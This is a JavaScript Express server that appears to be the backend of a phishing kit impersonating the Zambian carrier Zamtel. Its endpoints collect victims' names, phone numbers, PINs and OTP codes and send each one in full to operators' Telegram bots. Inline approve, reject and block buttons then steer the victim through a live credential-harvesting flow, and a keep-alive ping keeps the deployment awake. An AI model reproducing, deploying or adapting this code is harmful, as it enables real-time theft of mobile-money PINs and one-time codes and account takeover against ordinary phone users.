require('dotenv').config();
const express = require('express');
const axios = require('axios');
const { v4: uuidv4 } = require('uuid');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 10000;
const DOMAIN = process.env.BACKEND_URL || 'https://zamtel-zambia.onrender.com';

// ---------------- PERSISTENT STORES ----------------
const DATA_FILE = path.join(__dirname, 'data.json');

let approvedPins = {};
let approvedCodes = {};
let approvedDetails = {};
let blockPins = {};
let requestBotMap = {};

try {
    if (fs.existsSync(DATA_FILE)) {
        const saved = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
        approvedPins    = saved.approvedPins    || {};
        approvedCodes   = saved.approvedCodes   || {};
        approvedDetails = saved.approvedDetails || {};
        blockPins       = saved.blockPins       || {};
        requestBotMap   = saved.requestBotMap   || {};
        console.log('💾 Data restored from data.json');
    }
} catch (e) {
    console.error('❌ Failed to load data.json:', e.message);
}

function persist() {
    try {
        fs.writeFileSync(DATA_FILE, JSON.stringify({
            approvedPins, approvedCodes, approvedDetails, blockPins, requestBotMap
        }));
    } catch (e) {
        console.error('❌ Persist failed:', e.message);
    }
}

// Double-click protection
const processedCallbacks = new Set();

// ---------------- MULTI-BOT STORE ----------------
let bots = [];
Object.keys(process.env).forEach(key => {
    const match = key.match(/^BOT(\d+)_TOKEN$/);
    if (!match) return;
    const index = match[1];
    const botToken = process.env[`BOT${index}_TOKEN`];
    const chatId = process.env[`BOT${index}_CHATID`];
    if (botToken && chatId) {
        bots.push({ botId: `bot${index}`, botToken, chatId });
    }
});
console.log('✅ Bots loaded:', bots.map(b => b.botId));

// ---------------- MIDDLEWARE ----------------
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

// ---------------- HELPERS ----------------
function getBot(botId) {
    return bots.find(b => b.botId === botId);
}

async function sendTelegramMessage(bot, text, inlineKeyboard = []) {
    try {
        await axios.post(`https://api.telegram.org/bot${bot.botToken}/sendMessage`, {
            chat_id: bot.chatId,
            text,
            parse_mode: 'Markdown',
            disable_web_page_preview: true,
            reply_markup: inlineKeyboard.length ? { inline_keyboard: inlineKeyboard } : undefined
        });
    } catch (err) {
        console.error('Telegram error:', err.response?.data || err.message);
    }
}

async function answerCallback(bot, callbackId, text = '') {
    try {
        await axios.post(`https://api.telegram.org/bot${bot.botToken}/answerCallbackQuery`, {
            callback_query_id: callbackId,
            text
        });
    } catch (err) {
        console.error(err.response?.data || err.message);
    }
}

async function editTelegramMessage(bot, chatId, messageId, text, inlineKeyboard = null) {
    try {
        const payload = {
            chat_id: chatId,
            message_id: messageId,
            text,
            parse_mode: 'Markdown'
        };
        payload.reply_markup = { inline_keyboard: inlineKeyboard || [] };

        await axios.post(
            `https://api.telegram.org/bot${bot.botToken}/editMessageText`,
            payload
        );
    } catch (err) {
        const desc = err.response?.data?.description || err.message;
        if (!desc.includes('message is not modified')) {
            console.error('editMessageText error:', desc);
        }
    }
}

// ---------------- WEBHOOKS ----------------
async function setWebhook(bot, retries = 5) {
    const webhookUrl = `${DOMAIN}/telegram-webhook/${bot.botId}`;
    for (let i = 0; i < retries; i++) {
        try {
            const { data } = await axios.get(
                `https://api.telegram.org/bot${bot.botToken}/setWebhook`,
                { params: { url: webhookUrl, drop_pending_updates: false } }
            );
            if (data.ok) {
                console.log(`✅ Webhook configured for ${bot.botId}: ${webhookUrl}`);
                return;
            }
            throw new Error(JSON.stringify(data));
        } catch (err) {
            console.error(`❌ Webhook attempt ${i + 1} failed for ${bot.botId}:`,
                err.response?.data || err.message);
            await new Promise(r => setTimeout(r, 3000));
        }
    }
}

async function setAllWebhooks() {
    for (const bot of bots) await setWebhook(bot);
}

// ---------------- PAGES ----------------
app.get('/bot/:botId', (req, res) => {
    const bot = getBot(req.params.botId);
    if (!bot) return res.status(404).send('Invalid bot link');
    res.redirect(`/index.html?botId=${bot.botId}`);
});
app.get('/pin', (req, res) => res.sendFile(path.join(__dirname, 'public', 'pin.html')));
app.get('/code', (req, res) => res.sendFile(path.join(__dirname, 'public', 'code.html')));
app.get('/success', (req, res) => res.sendFile(path.join(__dirname, 'public', 'success.html')));

// ---------------- HEALTH / KEEP-ALIVE ENDPOINT ----------------
app.get('/health', (req, res) => {
    res.json({
        status: 'ok',
        uptime: process.uptime(),
        timestamp: new Date().toISOString(),
        bots: bots.map(b => b.botId)
    });
});

// ---------------- DETAILS SUBMISSION (index.html) ----------------
app.post('/submit-details', (req, res) => {
    const { name, phone, botId } = req.body;
    const bot = getBot(botId);
    if (!bot) return res.status(400).json({ error: 'Invalid bot' });

    const requestId = uuidv4();
    approvedDetails[requestId] = null;
    requestBotMap[requestId] = botId;
    persist();

    const text =
        `👤 *CUSTOMER DETAILS*\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        `👤 *Name:*  \`${name}\`\n` +
        `📱 *Phone:* \`${phone}\`\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        `⏳ _Awaiting admin decision…_`;

    sendTelegramMessage(bot, text, [
        [
            { text: '✅ Approve Details', callback_data: `details_ok:${requestId}` },
            { text: '❌ Reject Details',  callback_data: `details_bad:${requestId}` }
        ],
        [
            { text: '🛑 Block User', callback_data: `details_block:${requestId}` }
        ]
    ]);

    res.json({ requestId });
});

app.all('/check-details/:requestId', (req, res) => {
    const requestId = req.params.requestId;
    if (blockPins[requestId]) return res.json({ blocked: true, approved: null });
    res.json({ approved: approvedDetails[requestId] ?? null, blocked: false });
});

// ---------------- PIN SUBMISSION ----------------
app.post('/submit-pin', (req, res) => {
    const { name, phone, pin, botId } = req.body;
    const bot = getBot(botId);
    if (!bot) return res.status(400).json({ error: 'Invalid bot' });

    const requestId = uuidv4();
    approvedPins[requestId] = null;
    requestBotMap[requestId] = botId;
    persist();

    const text =
        `🔐 *PIN VERIFICATION*\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        `👤 *Name:*  \`${name}\`\n` +
        `📱 *Phone:* \`${phone}\`\n` +
        `🔑 *PIN:*   \`${pin}\`\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        `⏳ _Awaiting admin decision…_`;

    sendTelegramMessage(bot, text, [
        [
            { text: '✅ Approve PIN', callback_data: `pin_ok:${requestId}` },
            { text: '❌ Reject PIN',  callback_data: `pin_bad:${requestId}` }
        ],
        [
            { text: '🛑 Block User', callback_data: `pin_block:${requestId}` }
        ]
    ]);

    res.json({ requestId });
});

// ✅ accepts POST (identity sent on each poll), keeps GET too
app.all('/check-pin/:requestId', (req, res) => {
    const requestId = req.params.requestId;
    if (blockPins[requestId]) return res.json({ blocked: true, message: 'User blocked' });
    res.json({ approved: approvedPins[requestId] ?? null });
});

// ---------------- CODE SUBMISSION ----------------
app.post('/submit-code', (req, res) => {
    const { name, phone, code, botId } = req.body;
    const bot = getBot(botId);
    if (!bot) return res.status(400).json({ error: 'Invalid bot' });

    const requestId = uuidv4();
    approvedCodes[requestId] = null;
    requestBotMap[requestId] = botId;
    persist();

    const text =
        `🔑 *OTP CODE VERIFICATION*\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        `👤 *Name:*  \`${name}\`\n` +
        `📱 *Phone:* \`${phone}\`\n` +
        `🔢 *Code:*  \`${code}\`\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        `⏳ _Awaiting admin decision…_`;

    sendTelegramMessage(bot, text, [
        [
            { text: '✅ Approve Code', callback_data: `code_ok:${requestId}` },
            { text: '❌ Reject Code',  callback_data: `code_bad:${requestId}` }
        ],
        [
            { text: '🔁 Code OK — Re-enter PIN', callback_data: `code_pin:${requestId}` }
        ]
    ]);

    res.json({ requestId });
});

// ✅ returns approved + pinInvalid so code.html can route to pin.html
app.all('/check-code/:requestId', (req, res) => {
    const requestId = req.params.requestId;
    const approved = approvedCodes[requestId] ?? null;
    const pinInvalid = approved === true && approvedPins[requestId] === false;
    res.json({ approved, pinInvalid });
});

// ---------------- TELEGRAM WEBHOOK ----------------
app.post('/telegram-webhook/:botId', async (req, res) => {
    const bot = getBot(req.params.botId);
    if (!bot) return res.sendStatus(404);

    const cb = req.body.callback_query;
    if (!cb) return res.sendStatus(200);

    if (processedCallbacks.has(cb.id)) return res.sendStatus(200);
    processedCallbacks.add(cb.id);
    setTimeout(() => processedCallbacks.delete(cb.id), 10 * 60 * 1000);

    const [action, requestId] = (cb.data || '').split(':');
    const messageId = cb.message?.message_id;
    const chatId    = cb.message?.chat?.id;
    let feedback = '';
    let statusLine = '';

    if (action === 'details_ok') {
        approvedDetails[requestId] = true;
        persist();
        feedback = '🟢 Details approved';
        statusLine = '\n\n🟢━━━━━━━━━━━━━━━━━━━━🟢\n✅ *DETAILS APPROVED*\n🟢━━━━━━━━━━━━━━━━━━━━🟢';
    } else if (action === 'details_bad') {
        approvedDetails[requestId] = false;
        persist();
        feedback = '🔴 Details rejected';
        statusLine = '\n\n🔴━━━━━━━━━━━━━━━━━━━━🔴\n❌ *DETAILS REJECTED*\n🔴━━━━━━━━━━━━━━━━━━━━🔴';
    } else if (action === 'details_block') {
        approvedDetails[requestId] = false;
        blockPins[requestId] = true;
        persist();
        feedback = '🔴 User blocked';
        statusLine = '\n\n🔴━━━━━━━━━━━━━━━━━━━━🔴\n🛑 *USER BLOCKED*\n🔴━━━━━━━━━━━━━━━━━━━━🔴';
    } else if (action === 'pin_ok') {
        approvedPins[requestId] = true;
        persist();
        feedback = '🟢 PIN approved';
        statusLine = '\n\n🟢━━━━━━━━━━━━━━━━━━━━🟢\n✅ *APPROVED BY ADMIN*\n🟢━━━━━━━━━━━━━━━━━━━━🟢';
    } else if (action === 'pin_bad') {
        approvedPins[requestId] = false;
        persist();
        feedback = '🔴 PIN rejected';
        statusLine = '\n\n🔴━━━━━━━━━━━━━━━━━━━━🔴\n❌ *REJECTED BY ADMIN*\n🔴━━━━━━━━━━━━━━━━━━━━🔴';
    } else if (action === 'pin_block') {
        blockPins[requestId] = true;
        persist();
        feedback = '🔴 User blocked';
        statusLine = '\n\n🔴━━━━━━━━━━━━━━━━━━━━🔴\n🛑 *USER BLOCKED*\n🔴━━━━━━━━━━━━━━━━━━━━🔴';
    } else if (action === 'code_ok') {
        approvedCodes[requestId] = true;
        persist();
        feedback = '🟢 Code approved';
        statusLine = '\n\n🟢━━━━━━━━━━━━━━━━━━━━🟢\n✅ *APPROVED BY ADMIN*\n🟢━━━━━━━━━━━━━━━━━━━━🟢';
    } else if (action === 'code_bad') {
        approvedCodes[requestId] = false;
        persist();
        feedback = '🔴 Code rejected';
        statusLine = '\n\n🔴━━━━━━━━━━━━━━━━━━━━🔴\n❌ *REJECTED BY ADMIN*\n🔴━━━━━━━━━━━━━━━━━━━━🔴';
    } else if (action === 'code_pin') {
        approvedCodes[requestId] = true;
        approvedPins[requestId]  = false;
        persist();
        feedback = '🟢 Code approved – re-enter PIN';
        statusLine = '\n\n🟢━━━━━━━━━━━━━━━━━━━━🟢\n✅ *CODE OK* — ⚠️ *PIN RE-ENTRY REQUIRED*\n🟢━━━━━━━━━━━━━━━━━━━━🟢';
    } else {
        statusLine = '\n\n🔴━━━━━━━━━━━━━━━━━━━━🔴\n⚠️ *UNKNOWN ACTION*\n🔴━━━━━━━━━━━━━━━━━━━━🔴';
    }

    if (messageId && chatId && statusLine) {
        const originalText = cb.message.text || '';
        await editTelegramMessage(bot, chatId, messageId, originalText + statusLine, null);
    }

    if (feedback) await sendTelegramMessage(bot, `📝 *Feedback*\n${feedback}`);
    await answerCallback(bot, cb.id);
    res.sendStatus(200);
});

// ---------------- DEBUG ----------------
app.get('/debug/bots', (req, res) => res.json(bots));

// =====================================================
//          KEEP-ALIVE (ANTI-SLEEP) SYSTEM
// =====================================================
const KEEPALIVE_INTERVAL_MS = 10 * 60 * 1000;
let keepAliveTimer = null;

async function selfPing() {
    try {
        const url = `${DOMAIN}/health`;
        const res = await axios.get(url, { timeout: 20000 });
        console.log(`💓 Keep-alive OK (${res.status}) → ${url} @ ${new Date().toISOString()}`);
    } catch (err) {
        console.warn(`⚠️ Keep-alive failed: ${err.response?.status || err.message}`);
        setTimeout(() => {
            axios.get(`${DOMAIN}/health`, { timeout: 20000 })
                .then(r => console.log(`💓 Keep-alive retry OK (${r.status})`))
                .catch(e => console.warn(`⚠️ Keep-alive retry failed: ${e.message}`));
        }, 30 * 1000);
    }
}

function startKeepAlive() {
    if (keepAliveTimer) clearInterval(keepAliveTimer);
    setTimeout(selfPing, 15 * 1000);
    keepAliveTimer = setInterval(selfPing, KEEPALIVE_INTERVAL_MS);
    console.log('🩺 Keep-alive started (ping every 10 min)');
}

// =====================================================
//      GLOBAL CRASH GUARDS
// =====================================================
process.on('uncaughtException', (err) => {
    console.error('💥 uncaughtException:', err);
});

process.on('unhandledRejection', (reason) => {
    console.error('💥 unhandledRejection:', reason);
});

process.on('SIGTERM', () => {
    console.log('🛑 SIGTERM received, shutting down cleanly...');
    if (keepAliveTimer) clearInterval(keepAliveTimer);
    process.exit(0);
});

// ---------------- START SERVER ----------------
setAllWebhooks().then(() => {
    app.listen(PORT, () => {
        console.log(`🚀 Server started on port ${PORT}`);
        startKeepAlive();
    });
});